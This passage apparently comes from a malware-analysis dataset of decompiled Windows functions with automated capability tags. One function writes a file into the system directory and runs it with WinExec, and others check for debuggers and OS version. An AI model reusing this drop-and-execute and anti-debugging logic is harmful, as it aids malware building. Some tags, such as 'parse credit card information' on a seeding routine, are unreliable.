(extraout_ECX != 1 && cVar16 != '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *piVar10 = unaff_ESI + 4;\n        puVar8 = 0xfffffdd0;\n    }\n    uVar5 = 0xffffffff;\n    do {\n        piVar11 = piVar10;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        piVar11 = piVar10 + 1;\n        cVar16 = *piVar10;\n        piVar10 = piVar11;\n    } while (cVar16 != '\\0');\n    uVar5 = ~uVar5;\n    puVar9 = piVar11 - uVar5;\n    puVar12 = puVar8 + -300;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar12 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    uVar5 = uVar5 & 3;\n    bVar15 = (POPCOUNT(uVar5) & 1U) == 0;\n    for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    if ((bVar15) || (!bVar15)) {\n        puVar12 = 0x42044c;\n        uVar5 = 0xffffffff;\n    }\n    iVar4 = *0xbf17b43a;\n    cVar16 = puVar8 + -300 + 'C';\n    *(arg_ch + -0x3fcc0037) = *(arg_ch + -0x3fcc0037) + cVar16;\n    do {\n        puVar9 = puVar12;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        puVar9 = puVar12 + 1;\n        cVar1 = *puVar12;\n        puVar12 = puVar9;\n    } while (cVar16 != cVar1);\n    uVar5 = ~uVar5;\n    iVar7 = -1;\n    pcVar13 = iVar4 + -300;\n    do {\n        pcVar14 = pcVar13;\n        if (iVar7 == 0) break;\n        iVar7 = iVar7 + -1;\n        pcVar14 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar14;\n    } while (cVar16 != cVar1);\n    puVar9 = puVar9 - uVar5;\n    puVar12 = pcVar14 + -1;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar12 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(iVar4 + -300, 0, Var3 + -0x28);\n    if (arg_ch == -1) {\n        iVar7 = fcn.00403d70(*(iVar4 + 8));\n        *(iVar4 + -4) = iVar7;\n        if (iVar7 == -1) {\n            return 0;\n        }\n    }\n    uVar2 = *(iVar4 + -4);\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(uVar2, iVar4 + -0x24, iVar4 + -0x1c, iVar4 + -0x14);\n    if (*(iVar4 + 0xc) == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1554
    },
    "00404280": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404280(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402c50(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x420848, acStack1304, &uStack2112);\n    uStack2088 = 0x420900;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x420918;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004020e0(auStack1564, 0x420844, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1844
    },
    "00401e40": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f63) overlaps instruction at (ram,0x00401f62)\n// \n// WARNING: Removing unreachable block (ram,0x00401e5c)\n\nuint __cdecl fcn.00401e40(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    uint in_EAX;\n    uint *puVar4;\n    uint32_t uVar5;\n    char extraout_CL;\n    uint in_ECX;\n    int32_t iVar6;\n    char extraout_DL;\n    char extraout_DH;\n    int32_t unaff_EBX;\n    char *pcVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    uint *unaff_ESI;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint in_stack_ffffffac;\n    uint var_1fh;\n    \n    bVar13 = (POPCOUNT(in_ECX >> 8 | 0x47) & 1U) != 0;\n    uVar9 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    if ((!bVar13) || (bVar13)) {\n        in_EAX = *(uVar9 + 0x1c);\n        in_ECX = *(uVar9 + 0x18);\n    }\n    iVar8 = *0x10 + -0x30;\n    *(unaff_EBX + 0x4d8b1c45) = *(unaff_EBX + 0x4d8b1c45) | 0x18;\n    puVar4 = fcn.00403f60(in_ECX, in_EAX, 0x420458, 7);\n    bVar13 = puVar4 == NULL;\n    if (bVar13) {\n        return 0;\n    }\n    if (!bVar13) {\n        if (bVar13) {\n            *unaff_EDI = *unaff_ESI;\n            uVar10 = CONCAT11(0xdf, puVar4);\n            pcVar7 = puVar4 & 0xffff0000 | uVar10;\n            uVar9 = 0xb9e181d0;\n            *pcVar7 = *pcVar7 + extraout_DH;\n            puVar4 = puVar4 & 0xffff0000 | uVar10 & 0xffffff00 | puVar4 + extraout_DH;\n            puVar11 = unaff_EDI + 2;\n            unaff_EDI[1] = &stack0xffffffd0;\n            goto code_r0x00401ec6;\n        }\n    }\n    iVar8 = 0;\n    *(uVar9 - 0x20) = 0;\n    puVar11 = uVar9 - 0x1f;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\ncode_r0x00401ec6:\n    *puVar11 = iVar8;\n    *(puVar11 + 2) = iVar8;\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    uVar10 = 0;\n    do {\n        uVar5 = (*pcVar2)();\n        uVar5 = uVar5 & 0x800000ff;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xffffff00) + 1;\n        }\n        *((uVar9 - 0x20) + uVar10) = uVar5;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x20);\n    bVar13 = false;\n    bVar14 = (CONCAT11((uVar5 >> 8) - extraout_CL, uVar5 + '\\x01') - 1U & 0x637b) != 0;\n    puVar11 = uVar9 - 0x20;\n    puVar12 = puVar4;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar12 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    if ((bVar14) && (!bVar14)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar3 = fcn.004016f0(*(uVar9 + 8), *(uVar9 + 0xc), *(uVar9 + 0x10), *(uVar9 + 0x14), uVar9 - 0x20, 0x20, puVar4);\n    if ((bVar13) || (!bVar13)) {\n        in_stack_ffffffac = *(uVar9 + 0x18);\n    }\n    cVar1 = uVar3 - *puVar12;\n    uVar9 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar12) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 |\n            uVar3 < *puVar12 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n            (in_AC & 1) * 0x40000;\n    func_0x10187ed5();\n    *(puVar4 + 0x558b1c9f) = *(puVar4 + 0x558b1c9f) - extraout_DL;\n    fcn.00401000(uVar9, in_stack_ffffffac);\n    return 1;\n}\n",
        "token_count": 1506
    },
    "00401f80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401f80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402170();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00402db0();\n        arg_ch_01 = fcn.00402db0();\n        arg_ch_02 = fcn.00402db0();\n        fcn.00402c50(arg_10h, arg_ch_00);\n        fcn.00402c50(arg_8h, arg_ch_01);\n        fcn.00402c50(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x420428, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402cf0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x420434, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402cf0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x420434, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402cf0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402c50(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 631
    },
    "00402170": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.00402170(void)\n\n{\n    uint uVar1;\n    \n    if (*0x420938 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x420938 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00402310": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023c3) overlaps instruction at (ram,0x004023c2)\n// \n// WARNING: Removing unreachable block (ram,0x00402374)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004023c0)\n\nuint32_t __cdecl fcn.00402310(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    bool bVar5;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    uVar3 = arg_14h;\n    if (0 < arg_14h) {\n        iVar4 = 1;\n        do {\n            bVar5 = ((in_EDX & 0xffffff00 | var_8h >> 8 & 0xff) & arg_10h) != 0;\n            uVar1 = *(iVar4 % arg_ch + arg_8h);\n            if ((bVar5) && (!bVar5)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            uVar3 = (iVar4 + -1) % arg_ch;\n            uVar2 = arg_14h * '\\x02';\n            in_EDX = uVar3 & 0xffffff00;\n            *(arg_18h + -1 + iVar4) = uVar2 ^ *(var_8h + arg_10h) ^ *(uVar3 + arg_8h);\n            *(iVar4 + arg_18h) = uVar2 ^ uVar1;\n            uVar3 = var_8h + 1;\n            iVar4 = iVar4 + 2;\n            var_8h = uVar3;\n        } while (uVar3 < arg_14h);\n    }\n    return uVar3;\n}\n",
        "token_count": 478
    },
    "00403240": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403313) overlaps instruction at (ram,0x00403312)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00403240(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint32_t *puVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    uint32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint extraout_ECX_02;\n    ushort extraout_DX;\n    uint16_t extraout_DX_00;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    int32_t unaff_EBX;\n    uint *puVar10;\n    uint *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar16;\n    uint *unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    bool bVar17;\n    uchar uVar18;\n    bool bVar19;\n    uchar uVar20;\n    uchar uVar21;\n    bool bVar22;\n    uchar uVar23;\n    uchar uVar24;\n    uchar uVar25;\n    ulong uVar26;\n    ushort uVar27;\n    unkbyte3 Var28;\n    uchar uVar29;\n    uchar uVar30;\n    uchar uVar31;\n    uchar uVar32;\n    \n    while( true ) {\n        fcn.004013f0(0x420920, 9, 0x420428, 10);\n        fcn.004013f0(0x420920, 9, 0x420434, 0x12);\n        fcn.004013f0(0x420920, 9, 0x420448, 4);\n        fcn.004013f0(0x420920, 9, 0x42044c, 0xc);\n        fcn.004013f0(0x420920, 9, 0x420458, 7);\n        uVar6 = extraout_DX;\n        uVar9 = extraout_DX >> 8;\n        bVar17 = CARRY1(uVar6, uVar9);\n        bVar22 = SCARRY1(uVar6, uVar9);\n        bVar19 = uVar6 + uVar9 == '\\0';\n        uVar24 = 0x20;\n        uVar21 = 9;\n        fcn.004013f0(0x420920, 9, 0x420460, 0xb);\n        if ((bVar17 || bVar19) || (!bVar17 && !bVar19)) break;\n        if (!bVar22) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        in_ES = CONCAT11(uVar21, uVar24);\n    }\n    uVar24 = 0x78;\n    uVar27 = 0x4033;\n    uVar21 = 0;\n    fcn.004013f0(0x420920, 9, 0x42046c, 0xc);\n    if ((bVar22) || (!bVar22)) {\n        uVar24 = 8;\n        uVar27 = 0;\n        uVar21 = 0;\n    }\n    fcn.004013f0(0x420920, 9, 0x420478, CONCAT13(uVar21, CONCAT21(uVar27, uVar24)));\n    fcn.004013f0(0x420920, 9, 0x420480, 0xd);\n    fcn.004013f0(0x420920, 9, 0x420490, 0x18);\n    fcn.004013f0(0x420920, 9, 0x4204a8, 0x25);\n    fcn.004013f0(0x420920, 9, 0x4204d0, 10);\n    fcn.004013f0(0x420920, 9, 0x4204dc, 0xc);\n    fcn.004013f0(0x420920, 9, 0x4204e8, 0xd);\n    do {\n        fcn.004013f0(0x420920, 9, 0x4204f8, 6);\n        uVar7 = unaff_EBX & 0xff00 | unaff_EBX - 0x12;\n        bVar17 = uVar7 < extraout_DX_00;\n        bVar19 = (POPCOUNT(uVar7 - extraout_DX_00 & 0xff) & 1U) == 0;\n        uVar31 = 5;\n        uVar27 = 0;\n        uVar32 = 0;\n        uVar21 = 0;\n        uVar25 = 5;\n        uVar29 = 0x42;\n        uVar30 = 0;\n        uVar24 = 0;\n        Var28 = 9;\n        fcn.004013f0(0x420920, 9, 0x420500, 5);\n        if ((bVar19) || (!bVar19)) break;\n        segment(in_SS, *0x10 + -0x1b);\n        if (bVar17) {\n            uVar18 = CARRY1(*0xb7bc9eaf, extraout_CH);\n            uVar23 = SCARRY1(*0xb7bc9eaf, extraout_CH);\n            *0xb7bc9eaf = *0xb7bc9eaf + extraout_CH;\n            uVar20 = *0xb7bc9eaf == 0;\n            uVar6 = POPCOUNT(*0xb7bc9eaf);\n            goto code_r0x0040353e;\n        }\n    } while (bVar19);\n    uVar2 = fcn.004013f0(0x420920, 9, 0x420508, 0xd);\n    uVar18 = uVar2 < extraout_ECX;\n    uVar23 = SBORROW4(uVar2, extraout_ECX);\n    uVar20 = uVar2 - extraout_ECX == 0;\n    uVar6 = POPCOUNT(uVar2 - extraout_ECX & 0xff);\n    uVar31 = 0x19;\n    uVar27 = 0;\n    uVar32 = 0;\n    uVar21 = 0x18;\n    uVar25 = 5;\n    uVar29 = 0x42;\n    uVar30 = 0;\n    Var28 = 9;\n    uVar24 = 0;\ncode_r0x0040353e:\n    bVar17 = (uVar6 & 1) == 0;\n    fcn.004013f0(0x420920, CONCAT13(uVar24, Var28), CONCAT13(uVar30, CONCAT12(uVar29, CONCAT11(uVar25, uVar21))), \n                 CONCAT13(uVar32, CONCAT21(uVar27, uVar31)));\n    if ((!bVar17) && (bVar17)) {\n        puVar16 = &stack0xffffffe1;\n        cVar1 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    fcn.004013f0(0x420920, 9, 0x420534, 0xf);\n    if ((!uVar18 && !uVar20) &&\n       (unaff_ESI = unaff_ESI & 0xffff0000 | unaff_ESI & 0xff | (unaff_ESI >> 8) << 8,  uVar18 || uVar20)) {\n        if (!uVar23) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.004013f0(0x420920, 9, 0x420544, 0xe);\n    fcn.004013f0(0x420920, 9, 0x420554, 0xd);\n    uVar24 = SCARRY4(unaff_EBX, 1);\n    bVar17 = unaff_EBX == -1;\n    fcn.004013f0(0x420920, 9, 0x420564, 0xc);\n    if ((!bVar17) && (bVar17)) {\n        puVar16 = &stack0xffffffe1;\n        cVar1 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar3 = 0x403616;\n    fcn.004013f0(0x420920, 9, 0x420570, 0xf);\n    if ((uVar24) || (!uVar24)) {\n        uVar3 = 0xb;\n    }\n    bVar17 = false;\n    fcn.004013f0(0x420920, 9, 0x420580, uVar3);\n    if ((!bVar17) && (bVar17)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.004013f0(0x420920, 9, 0x42058c, 0xb);\n    puVar4 = fcn.004013f0(0x420920, 9, 0x420598, 0xb);\n    puVar16 = unaff_ESI + 1;\n    *unaff_EDI = *unaff_ESI;\n    bVar17 = 0xf695ffbd < &stack0xffffa176;\n    bVar19 = *0x10 == 0xf6965e48;\n    puVar4[-1] = 0x420920;\n    puVar4[-2] = 0x4036c0;\n    uVar3 = fcn.004013f0(puVar4[-1], *puVar4, puVar4[1], puVar4[2]);\n    puVar10 = puVar4 + -1;\n    if ((!bVar17 && !bVar19) && (puVar4[-2] = uVar3,  puVar10 = puVar4 + -1,  bVar17 || bVar19)) {\n        puVar16 = puVar4[-1];\n        puVar10 = puVar4 + -1;\n    }\n    *(puVar10 + -4) = 0xc;\n    *(puVar10 + -8) = 0x4205b0;\n    *(puVar10 + -0xc) = 9;\n    *(puVar10 + -0x10) = 0x420920;\n    *(puVar10 + -0x14) = 0x4036ea;\n    fcn.004013f0(*(puVar10 + -0x10), *(puVar10 + -0xc), *(puVar10 + -8), *(puVar10 + -4));\n    *(puVar10 + 0x1c) = extraout_EDX;\n    *(puVar10 + 0x1c) = 0xe;\n    *(puVar10 + 0x18) = 0x4205bc;\n    *(puVar10 + 0x14) = 9;\n    *(puVar10 + 0x10) = 0x420920;\n    *(puVar10 + 0xc) = 0x40371b;\n    uVar3 = fcn.004013f0(*(puVar10 + 0x10), *(puVar10 + 0x14), *(puVar10 + 0x18), *(puVar10 + 0x1c));\n    *(puVar10 + 0x1c) = uVar3;\n    *(puVar10 + 0x1c) = 0x11;\n    *(puVar10 + 0x18) = 0x4205cc;\n    *(puVar10 + 0x14) = 9;\n    *(puVar10 + 0x10) = 0x420920;\n    *(puVar10 + 0xc) = 0x403746;\n    fcn.004013f0(*(puVar10 + 0x10), *(puVar10 + 0x14), *(puVar10 + 0x18), *(puVar10 + 0x1c));\n    *(puVar10 + 0x1c) = unaff_EDI + 1;\n    uVar2 = *(puVar10 + 0x1c);\n    *(puVar10 + 0x1c) = 0x13;\n    *(puVar10 + 0x18) = 0x4205e0;\n    *(puVar10 + 0x14) = 9;\n    *(puVar10 + 0x10) = 0x420920;\n    *(puVar10 + 0xc) = 0x40377f;\n    fcn.004013f0(*(puVar10 + 0x10), *(puVar10 + 0x14), *(puVar10 + 0x18), *(puVar10 + 0x1c));\n    *(puVar10 + 0x1c) = extraout_ECX_00;\n    *(puVar10 + 0x1c) = 0x14;\n    *(puVar10 + 0x18) = 0x4205f4;\n    *(puVar10 + 0x14) = 9;\n    *(puVar10 + 0x10) = 0x420920;\n    *(puVar10 + 0xc) = 0x4037aa;\n    uVar26 = fcn.004013f0(*(puVar10 + 0x10), *(puVar10 + 0x14), *(puVar10 + 0x18), *(puVar10 + 0x1c));\n    *(puVar10 + 0x1c) = extraout_ECX_01;\n    *(puVar10 + 0x18) = uVar26 >> 0x20;\n    iVar8 = extraout_ECX_01 - uVar26;\n    uVar7 = iVar8 & 0xff00 | iVar8 ^ iVar8 >> 8 | 0x3d00 | CONCAT11(0xdf, unaff_EBX);\n    uVar6 = uVar7;\n    uVar9 = uVar7 >> 8;\n    uVar24 = uVar9 < uVar6;\n    uVar25 = SBORROW1(uVar9, uVar6);\n    uVar21 = uVar9 == uVar6;\n    *(puVar10 + 0x1c) = 0x33;\n    *(puVar10 + 0x18) = 0x420608;\n    puVar11 = puVar10 + 0x14;\n    *(puVar10 + 0x14) = 9;\n    do {\n        puVar11[-1] = 0x420920;\n        puVar11[-2] = 0x4037df;\n        fcn.004013f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n        puVar10 = puVar11 + -1;\n        if ((!uVar24 && !uVar21) && (puVar10 = puVar11 + -1,  uVar24 || uVar21)) {\n            puVar10 = puVar11;\n        }\n        *(puVar10 + -4) = 10;\n        *(puVar10 + -8) = 0x42063c;\n        *(puVar10 + -0xc) = 9;\n        puVar13 = puVar10 + -0x10;\n        *(puVar10 + -0x10) = 0x420920;\n        *(puVar10 + -0x14) = 0x403803;\n        puVar5 = fcn.004013f0(*(puVar10 + -0x10), *(puVar10 + -0xc), *(puVar10 + -8), *(puVar10 + -4));\n        if (uVar24) goto code_r0x00403828;\n        puVar12 = puVar10 + -0x12;\n        *(puVar10 + -0x12) = uVar2;\n        while( true ) {\n            uVar2 = uVar2 & 0xffff0000 | *puVar12;\n            puVar13 = puVar12 + 1;\n            if (uVar24) break;\ncode_r0x00403828:\n            *(puVar13 + -4) = 4;\n            *(puVar13 + -8) = 0x420648;\n            *(puVar13 + -0xc) = 9;\n            puVar12 = puVar13 + -0x10;\n            *(puVar13 + -0x10) = 0x420920;\n            *(puVar13 + -0x14) = 0x40383b;\n            puVar5 = fcn.004013f0(*(puVar13 + -0x10), *(puVar13 + -0xc), *(puVar13 + -8), *(puVar13 + -4));\n            if (uVar24 || uVar21) {\ncode_r0x0040385d:\n                *(puVar13 + -0x14) = 5;\n                *(puVar13 + -0x18) = 0x42064c;\n                *(puVar13 + -0x1c) = 9;\n                *(puVar13 + -0x20) = 0x420920;\n                *(puVar13 + -0x24) = 